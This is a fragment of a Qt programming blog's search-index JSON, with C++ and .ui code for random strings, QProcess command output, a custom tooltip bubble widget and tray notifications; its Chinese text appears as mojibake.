QWidget::eventFilter(wcg,event);&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘éšæœºå­—ç¬¦ä¸²","date":"2023-10-27T01:24:02.240Z","path":"B_Code/Qt/ã€Qtã€‘éšæœºå­—ç¬¦ä¸²/","text":"Qtç”Ÿæˆè‡ªå®šä¹‰å­—ç¬¦ä¸² 1234567891011121314151617qsrand(QDateTime::currentMSecsSinceEpoch());const char ch[] = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;int size = sizeof(ch);char* str = new char[nLen + 1];int num = 0;for (int nIndex = 0; nIndex &lt; nLen; ++nIndex)&#123; num = rand() % (size - 1); str[nIndex] = ch[num];&#125;str[nLen] = &#x27;\\0&#x27;;QString res(str); QLOG_INFO() &lt;&lt; __FUNCTION__ &lt;&lt; __LINE__ &lt;&lt; res; m_RandomCode = res;","tags":[{"name":"å­—ç¬¦ä¸²","slug":"å­—ç¬¦ä¸²","permalink":"https://hodlyounger.github.io/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"","date":"2023-10-27T01:24:02.239Z","path":"B_Code/Qt/ã€Qtã€‘è·å–cmdè¾“å‡º/","text":"Qt ä½¿ç”¨ QProcess æ‰§è¡Œå‘½ä»¤è¡Œè„šæœ¬ï¼Œå¹¶é€šè¿‡ readAllStandardOutput è·å–å…¶è¾“å‡ºã€‚ 123456789101112131415161718192021222324252627#include &lt;QCoreApplication&gt;#include &lt;QProcess&gt;#include &lt;QDebug&gt;int main(int argc, char *argv[])&#123; QCoreApplication a(argc, argv); // åˆ›å»ºä¸€ä¸ªQProcesså¯¹è±¡ QProcess cmdProcess; // è®¾ç½®è¦æ‰§è¡Œçš„å‘½ä»¤ QString command = &quot;your_cmd_command&quot;; // å¯åŠ¨å‘½ä»¤å¹¶ç­‰å¾…å®ƒå®Œæˆ cmdProcess.start(command); cmdProcess.waitForFinished(); // è·å–å‘½ä»¤è¾“å‡º QByteArray output = cmdProcess.readAllStandardOutput(); // å°†è¾“å‡ºè½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶è¾“å‡º QString outputStr = QString::fromLocal8Bit(output); qDebug() &lt;&lt; outputStr; return a.exec();&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"Windows/cmd","slug":"Windows-cmd","permalink":"https://hodlyounger.github.io/tags/Windows-cmd/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘è‡ªå®šä¹‰æ°”æ³¡","date":"2023-10-27T01:24:02.238Z","path":"B_Code/Qt/ã€Qtã€‘è‡ªå®šä¹‰æ°”æ³¡/","text":"Qt è‡ªå®šä¹‰æ°”æ³¡ [toc] 1. æ•ˆæœ 2. å®ç°é€»è¾‘ 2.1. ç»˜åˆ¶å¼¹å‡ºçš„æ°”æ³¡ å¼¹å‡ºæ°”æ³¡çš„ä¸»è¦éƒ¨åˆ†å·²ç»ç”¨uiæ–‡ä»¶ç”Ÿæˆäº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯æ°”æ³¡çš„ä¸‰è§’åŒºåŸŸï¼Œä¹Ÿæ˜¯æ¯”è¾ƒéš¾çš„ä¸€ä¸ªéƒ¨åˆ† 2.1.1. uiæ–‡ä»¶ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;qFloatWidget&lt;/class&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;qFloatWidget&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;191&lt;/width&gt; &lt;height&gt;105&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Form&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_2&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget&quot;&gt; &lt;property name=&quot;currentIndex&quot;&gt; &lt;number&gt;0&lt;/number&gt; &lt;/property&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_4&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label_2&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;2&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_2&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_3&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;1&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections/&gt;&lt;/ui&gt; 2.1.2. ç»˜åˆ¶ä¸‰è§’åŒºåŸŸä»£ç  ä¸‰è§’åŒºåŸŸçš„ä½ç½®å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚ä¿®æ”¹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162QPainter painter(this); QPainterPath drawPath; painter.setRenderHint(QPainter::Antialiasing, true); // painter.setPen(QPen(Qt::blue, 1)); painter.setPen(Qt::NoPen); painter.setBrush(Qt::white); // å°ä¸‰è§’åŒºåŸŸ; QPolygon trianglePolygon; QRect myRect(ui-&gt;stackedWidget-&gt;x(), ui-&gt;stackedWidget-&gt;y(), ui-&gt;stackedWidget-&gt;width(), ui-&gt;stackedWidget-&gt;height()); // è®¾ç½®å°ä¸‰çš„å…·ä½“ä½ç½® int tri_pos_x, tri_pos_y; m_offset = ui-&gt;stackedWidget-&gt;width() / 2 - m_triangleWidth / 2; switch (derect) &#123; case up:&#123; // å°ä¸‰è§’å·¦è¾¹çš„ç‚¹çš„ä½ç½® tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); // å°ä¸‰è§’èµ·ç‚¹ trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y - m_triangleHeight); &#125; break; case left:&#123; // å°ä¸‰ä¸Šè¾¹ç‚¹çš„ä½ç½® tri_pos_x = myRect.x(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x - m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case right:&#123; // å°ä¸‰ä¸Šè¾¹ç‚¹çš„ä½ç½® tri_pos_x = myRect.x() + myRect.width(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case down:&#123; // å°ä¸‰å·¦è¾¹ç‚¹çš„ä½ç½® tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y() + myRect.height(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y + m_triangleHeight); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); &#125; break; default: break; &#125; drawPath.addRoundedRect(myRect, BORDER_RADIUS, BORDER_RADIUS); drawPath.addPolygon(trianglePolygon); painter.drawPath(drawPath); ä»¥ä¸Šå°±æ˜¯ä¸»è¦çš„ç»˜å›¾äº‹ä»¶ï¼Œåˆ›å»ºäº†ä¸€ä¸ªå¸¦ä¸‰è§’çš„æ°”æ³¡ç•Œé¢ã€‚æ¥ä¸‹æ¥å°±æ˜¯åœ¨ä¸»ç•Œé¢å»å“åº”äº†ã€‚ 2.2. é¼ æ ‡äº‹ä»¶ é¼ æ ‡æ—¶é—´è¿˜æ˜¯ç”¨åˆ°äº†QLabelçš„è¿‡æ»¤å™¨ï¼Œç›‘å¬ QEvent::Enter å’Œ QEvent::Leave ä¸¤ä¸ªäº‹ä»¶ã€‚å…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213141516171819202122232425262728293031bool Widget::eventFilter(QObject *obj, QEvent *event)&#123; QString str = QString(&quot;&lt;style&gt; span &#123;text-decoration: none; color: #006FFF;font-family: Microsoft YaHei;&#125;&lt;/style&gt; &lt;span&gt;è¿æ¥%1&lt;/span&gt; &lt;br&gt; è™šæ‹Ÿåœ°å€ï¼š%2&lt;br&gt;ç™»å½•åœ°å€ï¼š%3&quot;).arg(&quot;å·²æˆåŠŸ&quot;).arg(&quot;192.168.0.0&quot;).arg(&quot;192.168.0.1&quot;); static int x = 0; static int y = 0; static uint8_t flag=0; if(obj == ui-&gt;label) &#123; if(event-&gt;type() == QEvent::Enter) &#123; ui-&gt;label-&gt;setText(&quot;è¿›å…¥&quot;); QPoint GlobalPoint(ui-&gt;label-&gt;mapToGlobal(QPoint(0, 0)));//è·å–æ§ä»¶åœ¨çª—ä½“ä¸­çš„åæ ‡ x = GlobalPoint.x(); y = GlobalPoint.y() + ui-&gt;label-&gt;height(); qDebug() &lt;&lt; x &lt;&lt; &quot;:&quot; &lt;&lt; y ; m_widget-&gt;myMove(x, y); m_widget-&gt;setDerection(qFloatWidget::up); m_widget-&gt;show(); &#125; else if(event-&gt;type() == QEvent::Leave) &#123; ui-&gt;label-&gt;setText((&quot;ç¦»å¼€&quot;)); m_widget-&gt;hide(); &#125; &#125; return QWidget::eventFilter(obj,event);&#125; 2.3. åŠ¨ç”» åŠ¨ç”»å†…å®¹æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦åˆ›å»ºä¸€ä¸ªç®€å•çš„ä½ç§»åŠ¨ç”»å°±å¯ä»¥äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å»æ‰åŠ¨ç”»ï¼Œç›´æ¥è®©æ°”æ³¡å¼¹å‡ºã€‚ 12345678// æ·»åŠ åŠ¨ç”»// ä½ç§»QPropertyAnimation *pPosAnimation1 = new QPropertyAnimation(m_widget, &quot;pos&quot;);pPosAnimation1-&gt;setDuration(1000);pPosAnimation1-&gt;setStartValue(QCursor::pos());pPosAnimation1-&gt;setEndValue(QPoint(x,y));pPosAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad);pPosAnimation1-&gt;start(); 3. å®Œæ•´ä»£ç  3.1. QFloatWidget.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#ifndef QFLOATWIDGET_H#define QFLOATWIDGET_H#include &lt;QWidget&gt;#if defined(_MSC_VER) &amp;&amp; (_MSC_VER &gt;= 1600) #pragma execution_character_set(&quot;utf-8&quot;)#endifconst int SHADOW_WIDTH = 30; // çª—å£é˜´å½±å®½åº¦;const int TRIANGLE_WIDTH = 30; // å°ä¸‰è§’çš„å®½åº¦;const int TRIANGLE_HEIGHT = 10; // å°ä¸‰è§’çš„é«˜åº¦;const int BORDER_RADIUS = 15; // çª—å£è¾¹è§’çš„å¼§åº¦;namespace Ui &#123;class qFloatWidget;&#125;class qFloatWidget : public QWidget&#123; Q_OBJECTpublic: qFloatWidget(QWidget *parent = nullptr); ~qFloatWidget(); enum Derection&#123; left, right, up, down &#125;; // è®¾ç½®å°ä¸‰è§’èµ·å§‹ä½ç½®; void setStartPos(int startX); // è®¾ç½®å°ä¸‰è§’å®½å’Œé«˜; void setTriangleInfo(int width, int height); // è®¾ç½®å°ä¸‰è§’çš„ä½ç½® void setDerection(Derection d); // æ¯”èµ·å·¦ä¸Šè§’çš„ä½ç½® ç”¨æˆ·æ›´å…³å¿ƒå°ä¸‰è§’çš„å°–å°–çš„ä½ç½® é‡è½½moveä»¥ä¾¿ç”¨æˆ·æ›´å®¹æ˜“å®šä½æ°”æ³¡æ¡†çš„ä½ç½® // x,y æ˜¯æ°”æ³¡çª—å£å°è´±è´±çš„åæ ‡ void myMove(int x, int y); void setWidgetIndex(int i);protected: void paintEvent(QPaintEvent *);private: // å°ä¸‰è§’çš„åç§»é‡; int m_offset; // å°ä¸‰è§’çš„å®½åº¦; int m_triangleWidth; // å°ä¸‰è§’é«˜åº¦; int m_triangleHeight; Derection derect; Ui::qFloatWidget *ui;&#125;;#endif // QFLOATWIDGET_H 3.2. QFloatWidget.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#include &quot;qfloatwidget.h&quot;#include &quot;ui_qfloatwidget.h&quot;#include &lt;QGraphicsDropShadowEffect&gt;#include &lt;QHBoxLayout&gt;#include &lt;QPoint&gt;#include &lt;QPainter&gt;#include &lt;QImage&gt;#include &lt;QVariant&gt;#include &lt;QPropertyAnimation&gt;qFloatWidget::qFloatWidget(QWidget *parent) : QWidget(parent), m_offset(50), m_triangleWidth(TRIANGLE_WIDTH), m_triangleHeight(TRIANGLE_HEIGHT), ui(new Ui::qFloatWidget)&#123; ui-&gt;setupUi(this); setWindowFlags(Qt::FramelessWindowHint); setAttribute(Qt::WA_TranslucentBackground); setAttribute(Qt::WA_NoSystemBackground); //è®¾ç½®å…·ä½“é˜´å½± QGraphicsDropShadowEffect *shadow_effect = new QGraphicsDropShadowEffect(this); shadow_effect-&gt;setOffset(0, 0); shadow_effect-&gt;setColor(QColor(0, 133, 255)); shadow_effect-&gt;setBlurRadius(5); this-&gt;setGraphicsEffect(shadow_effect);&#125;qFloatWidget::~qFloatWidget()&#123; delete ui;&#125;void qFloatWidget::setStartPos(int startX)&#123; m_offset = startX; repaint();&#125;void qFloatWidget::setTriangleInfo(int width, int height)&#123; m_triangleWidth = width; m_triangleHeight = height;&#125;void qFloatWidget::setDerection(Derection d)&#123; derect = d;&#125;void qFloatWidget::myMove(int x, int y)&#123; int top_left_x, top_left_y; switch (derect) &#123; case down: top_left_x = x - m_offset - m_triangleWidth / 2 - ui-&gt;stackedWidget-&gt;x(); top_left_y = y - m_triangleHeight - ui-&gt;stackedWidget-&gt;height() - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; case up: top_left_x = x - m_offset - m_triangleWidth / 2 - ui-&gt;stackedWidget-&gt;x(); top_left_y = y + m_triangleHeight - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; case left: top_left_x = x + m_triangleHeight - ui-&gt;stackedWidget-&gt;x(); top_left_y = y - m_offset - m_triangleWidth / 2 - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; case right: top_left_x = x - m_triangleHeight - ui-&gt;stackedWidget-&gt;width() - ui-&gt;stackedWidget-&gt;x(); top_left_y = y - m_triangleWidth / 2 - m_offset - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; default: break; &#125;&#125;void qFloatWidget::setWidgetIndex(int i)&#123; ui-&gt;stackedWidget-&gt;setCurrentIndex(i);&#125;void qFloatWidget::paintEvent(QPaintEvent *)&#123; QPainter painter(this); QPainterPath drawPath; painter.setRenderHint(QPainter::Antialiasing, true); // painter.setPen(QPen(Qt::blue, 1)); painter.setPen(Qt::NoPen); painter.setBrush(Qt::white); // å°ä¸‰è§’åŒºåŸŸ; QPolygon trianglePolygon; QRect myRect(ui-&gt;stackedWidget-&gt;x(), ui-&gt;stackedWidget-&gt;y(), ui-&gt;stackedWidget-&gt;width(), ui-&gt;stackedWidget-&gt;height()); // è®¾ç½®å°ä¸‰çš„å…·ä½“ä½ç½® int tri_pos_x, tri_pos_y; m_offset = ui-&gt;stackedWidget-&gt;width() / 2 - m_triangleWidth / 2; switch (derect) &#123; case up:&#123; // å°ä¸‰è§’å·¦è¾¹çš„ç‚¹çš„ä½ç½® tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); // å°ä¸‰è§’èµ·ç‚¹ trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y - m_triangleHeight); &#125; break; case left:&#123; // å°ä¸‰ä¸Šè¾¹ç‚¹çš„ä½ç½® tri_pos_x = myRect.x(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x - m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case right:&#123; // å°ä¸‰ä¸Šè¾¹ç‚¹çš„ä½ç½® tri_pos_x = myRect.x() + myRect.width(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case down:&#123; // å°ä¸‰å·¦è¾¹ç‚¹çš„ä½ç½® tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y() + myRect.height(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y + m_triangleHeight); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); &#125; break; default: break; &#125; drawPath.addRoundedRect(myRect, BORDER_RADIUS, BORDER_RADIUS); drawPath.addPolygon(trianglePolygon); painter.drawPath(drawPath);&#125; 3.3. QFloatWidget.ui 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;qFloatWidget&lt;/class&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;qFloatWidget&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;191&lt;/width&gt; &lt;height&gt;105&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Form&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_2&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget&quot;&gt; &lt;property name=&quot;currentIndex&quot;&gt; &lt;number&gt;0&lt;/number&gt; &lt;/property&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_4&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label_2&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;2&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_2&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_3&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;1&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections/&gt;&lt;/ui&gt; 3.4. widget.h 12345678910111213141516171819202122232425262728293031323334#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include &lt;QMouseEvent&gt;#include &quot;qmylabel.h&quot;#include &quot;qfloatwidget.h&quot;#if defined(_MSC_VER) &amp;&amp; (_MSC_VER &gt;= 1600) #pragma execution_character_set(&quot;utf-8&quot;)#endifQT_BEGIN_NAMESPACEnamespace Ui &#123; class Widget; &#125;QT_END_NAMESPACEclass Widget : public QWidget&#123; Q_OBJECTpublic: Widget(QWidget *parent = nullptr); ~Widget();protected: bool eventFilter(QObject *obj, QEvent *event);private: Ui::Widget *ui; qFloatWidget *m_widget;&#125;;#endif // WIDGET_H 3.5. widget.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;#include &lt;QDebug&gt;#include&lt;QPropertyAnimation&gt;#include &lt;QGraphicsEffect&gt;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); m_widget = new qFloatWidget(); ui-&gt;label-&gt;installEventFilter(this);&#125;Widget::~Widget()&#123; delete ui;&#125;bool Widget::eventFilter(QObject *obj, QEvent *event)&#123; QString str = QString(&quot;&lt;style&gt; span &#123;text-decoration: none; color: #006FFF;font-family: Microsoft YaHei;&#125;&lt;/style&gt; &lt;span&gt;è¿æ¥%1&lt;/span&gt; &lt;br&gt; è™šæ‹Ÿåœ°å€ï¼š%2&lt;br&gt;ç™»å½•åœ°å€ï¼š%3&quot;).arg(&quot;å·²æˆåŠŸ&quot;).arg(&quot;192.168.0.0&quot;).arg(&quot;192.168.0.1&quot;); static int x = 0; static int y = 0; static uint8_t flag=0; if(obj == ui-&gt;label) &#123; if(event-&gt;type() == QEvent::Enter) &#123; ui-&gt;label-&gt;setText(&quot;è¿›å…¥&quot;); QPoint GlobalPoint(ui-&gt;label-&gt;mapToGlobal(QPoint(0, 0)));//è·å–æ§ä»¶åœ¨çª—ä½“ä¸­çš„åæ ‡ x = GlobalPoint.x(); y = GlobalPoint.y() + ui-&gt;label-&gt;height(); qDebug() &lt;&lt; x &lt;&lt; &quot;:&quot; &lt;&lt; y ; m_widget-&gt;myMove(x, y); m_widget-&gt;setDerection(qFloatWidget::up); m_widget-&gt;show(); &#125; else if(event-&gt;type() == QEvent::Leave) &#123; ui-&gt;label-&gt;setText((&quot;ç¦»å¼€&quot;)); m_widget-&gt;hide(); &#125; &#125; // æ·»åŠ åŠ¨ç”» // ä½ç§» QPropertyAnimation *pPosAnimation1 = new QPropertyAnimation(m_widget, &quot;pos&quot;); pPosAnimation1-&gt;setDuration(1000); pPosAnimation1-&gt;setStartValue(QCursor::pos()); pPosAnimation1-&gt;setEndValue(QPoint(x,y)); pPosAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad); pPosAnimation1-&gt;start(); return QWidget::eventFilter(obj,event);&#125; 3.6. widget.ui 12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;Widget&lt;/class&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;Widget&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;497&lt;/width&gt; &lt;height&gt;252&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Widget&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;123123123123&lt;/string&gt; &lt;/property&gt; &lt;property name=&quot;textFormat&quot;&gt; &lt;enum&gt;Qt::PlainText&lt;/enum&gt; &lt;/property&gt; &lt;property name=&quot;wordWrap&quot;&gt; &lt;bool&gt;false&lt;/bool&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections/&gt;&lt;/ui&gt;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"æ°”æ³¡","slug":"æ°”æ³¡","permalink":"https://hodlyounger.github.io/tags/%E6%B0%94%E6%B3%A1/"},{"name":"è‡ªå®šä¹‰æ§ä»¶","slug":"è‡ªå®šä¹‰æ§ä»¶","permalink":"https://hodlyounger.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘åœ¨Winç³»ç»Ÿä¸Šçš„æ¶ˆæ¯é€šçŸ¥","date":"2023-10-27T01:24:02.237Z","path":"B_Code/Qt/ã€Qtã€‘Winæ¶ˆæ¯é€šçŸ¥/","text":"[TOC] éœ€æ±‚æè¿°ï¼š Qtåº”ç”¨ç¨‹åºåœ¨windowsç³»ç»Ÿä¸Šå‘é€winæ¶ˆæ¯é€šçŸ¥ æ¼”ç¤º ä»£ç  ä»£ç å®ç°å¾ˆç®€å•ï¼Œä¸»è¦è°ƒç”¨çš„æ¥å£ä¸ºQSystemTrayIcon.showMessage() ä½¿ç”¨çš„Demoä¸º ã€Qtã€‘ é¼ æ ‡ hover æ“ä½œæ—¶å¼¹å‡ºæ–‡å­—æ°”æ³¡_æ¬§æ©æ„çš„åšå®¢-CSDNåšå®¢ è¿™ç¯‡æ–‡ç« ï¼Œç»“åˆå›¾ç‰‡éšè—æ˜¾ç¤ºï¼Œåœ¨ç³»ç»Ÿæ˜¾ç¤ºé€šçŸ¥ã€‚ widget.h 1234567891011121314151617181920212223242526272829303132#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include &lt;QImage&gt;#include &lt;QPixmap&gt;#include &lt;QSystemTrayIcon&gt;#include &lt;QMenu&gt;#include &lt;QIcon&gt;#include &lt;QAction&gt;QT_BEGIN_NAMESPACEnamespace Ui &#123; class Widget; &#125;QT_END_NAMESPACEclass Widget : public QWidget&#123; Q_OBJECTpublic: Widget(QWidget *parent = nullptr); ~Widget();public: QSystemTrayIcon *trayIcon;private slots: void stTrayIconActive(QSystemTrayIcon::ActivationReason acReason); void on_pushButton_clicked();private: Ui::Widget *ui;&#125;;#endif // WIDGET_H widget.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); QPixmap img(&quot;:/Win11.jpg&quot;); ui-&gt;label-&gt;setPixmap(img); ui-&gt;label-&gt;setScaledContents(true); ui-&gt;label-&gt;setToolTip(QString(&quot;å£çº¸ã€ŠWin11.pngã€‹&quot;)); ui-&gt;pushButton-&gt;setToolTip(QString(&quot;éšè—æˆ–æ˜¾ç¤ºå›¾ç‰‡&quot;)); QIcon icon = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)0); QIcon icon1 = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)9); //è®¾ç½®é€šçŸ¥æ çš„å›¾æ ‡ trayIcon = new QSystemTrayIcon(this); trayIcon-&gt;setIcon(icon); //è®¾ç½®é€šçŸ¥æ 